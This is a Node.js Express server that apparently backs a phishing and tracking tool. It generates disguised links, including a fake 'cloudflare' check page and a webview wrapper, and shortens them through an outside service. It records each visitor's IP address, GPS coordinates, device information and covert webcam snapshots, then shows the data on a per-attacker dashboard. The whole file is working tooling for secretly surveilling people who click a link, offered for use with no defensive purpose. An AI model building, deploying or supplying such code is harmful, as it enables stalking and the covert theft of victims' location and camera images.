const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Configuration
const hostURL = process.env.HOST_URL || `http://localhost:${PORT}`;
const use1pt = process.env.USE_SHORTENER !== 'false'; // Toggle for URL shortening

// Data storage
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

// Serve data files (for camera snapshots)
app.use('/data', express.static(dataDir));

// Helper function to save data
function saveData(userId, data) {
    const userFile = path.join(dataDir, `${userId}.json`);
    let userData = [];

    if (fs.existsSync(userFile)) {
        try {
            userData = JSON.parse(fs.readFileSync(userFile, 'utf8'));
        } catch (e) {
            console.error('Error reading user data:', e);
            userData = [];
        }
    }

    userData.push({
        timestamp: new Date().toISOString(),
        data: data
    });

    try {
        fs.writeFileSync(userFile, JSON.stringify(userData, null, 2));
    } catch (e) {
        console.error('Error saving user data:', e);
    }
}

// Routes
app.get('/', (req, res) => {
    res.render('index', { hostURL });
});

app.get('/dashboard/:userId', (req, res) => {
    const userId = req.params.userId;
    const userFile = path.join(dataDir, `${userId}.json`);

    let userData = [];
    if (fs.existsSync(userFile)) {
        try {
            userData = JSON.parse(fs.readFileSync(userFile, 'utf8'));
        } catch (e) {
            console.error('Error reading dashboard data:', e);
        }
    }

    res.render('dashboard', { userId, data: userData, hostURL });
});

app.get('/w/:path/:uri', (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] ||
        req.connection?.remoteAddress ||
        req.ip;
    const d = new Date().toJSON().slice(0, 19).replace('T', ':');

    if (req.params.path != null) {
        try {
            res.render('webview', {
                ip: ip,
                time: d,
                url: Buffer.from(req.params.uri, 'base64').toString(),
                uid: req.params.path,
                a: hostURL,
                t: use1pt
            });
        } catch (e) {
            console.error('Error rendering webview:', e);
            res.status(400).send('Invalid URL');
        }
    } else {
        res.redirect('/');
    }
});

app.get('/c/:path/:uri', (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] ||
        req.connection?.remoteAddress ||
        req.ip;
    const d = new Date().toJSON().slice(0, 19).replace('T', ':');

    if (req.params.path != null) {
        try {
            res.render('cloudflare', {
                ip: ip,
                time: d,
                url: Buffer.from(req.params.uri, 'base64').toString(),
                uid: req.params.path,
                a: hostURL,
                t: use1pt
            });
        } catch (e) {
            console.error('Error rendering cloudflare:', e);
            res.status(400).send('Invalid URL');
        }
    } else {
        res.redirect('/');
    }
});

app.post('/location', (req, res) => {
    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    const uid = decodeURIComponent(req.body.uid) || null;
    const acc = decodeURIComponent(req.body.acc) || null;

    if (lon != null && lat != null && uid != null && acc != null) {
        saveData(uid, {
            type: 'location',
            latitude: lat,
            longitude: lon,
            accuracy: acc
        });
        res.send('Done');
    } else {
        res.status(400).send('Invalid data');
    }
});

app.post('/', (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const data = decodeURIComponent(req.body.data) || null;

    if (uid != null && data != null) {
        saveData(uid, {
            type: 'info',
            content: data.replace(/<br>/g, '\n')
        });
        res.send('Done');
    } else {
        res.status(400).send('Invalid data');
    }
});

app.post('/camsnap', (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    const img = decodeURIComponent(req.body.img) || null;

    if (uid != null && img != null) {
        try {
            const buffer = Buffer.from(img, 'base64');
            const filename = `camsnap_${Date.now()}.png`;
            const filepath = path.join(dataDir, filename);

            fs.writeFileSync(filepath, buffer);

            saveData(uid, {
                type: 'camsnap',
                filename: filename
            });

            res.send('Done');
        } catch (e) {
            console.error('Error saving camera snapshot:', e);
            res.status(500).send('Error saving snapshot');
        }
    } else {
        res.status(400).send('Invalid data');
    }
});

// API endpoint to create links
app.post('/api/create-link', async (req, res) => {
    const { url, userId } = req.body;

    if (!url || !url.match(/^https?:\/\//i)) {
        return res.status(400).json({ error: 'Please enter a valid URL, including http or https.' });
    }

    const encodedUrl = `${userId}/${Buffer.from(url).toString('base64')}`;
    const cUrl = `${hostURL}/c/${encodedUrl}`;
    const wUrl = `${hostURL}/w/${encodedUrl}`;

    let response = {
        cloudflareLink: cUrl,
        webviewLink: wUrl,
        originalUrl: url
    };

    if (use1pt) {
        try {
            const https = require('https');

            // Function to make HTTPS request
            const makeRequest = (url) => {
                return new Promise((resolve, reject) => {
                    https.get(url, (res) => {
                        let data = '';
                        res.on('data', (chunk) => data += chunk);
                        res.on('end', () => {
                            try {
                                resolve(JSON.parse(data));
                            } catch (e) {
                                reject(e);
                            }
                        });
                    }).on('error', reject);
                });
            };

            const shortCUrl = await makeRequest(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`);
            const shortWUrl = await makeRequest(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`);

            response.cloudflareShortLinks = Object.values(shortCUrl);
            response.webviewShortLinks = Object.values(shortWUrl);
        } catch (error) {
            console.error('Error shortening URLs:', error);
            // Continue without shortened links
        }
    }

    res.json(response);
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`✅ App running on port ${PORT}!`);
    console.log(`🌐 Visit ${hostURL} to get started`);
    console.log(`📊 Dashboard: ${hostURL}/dashboard/YOUR_USER_ID`);
});
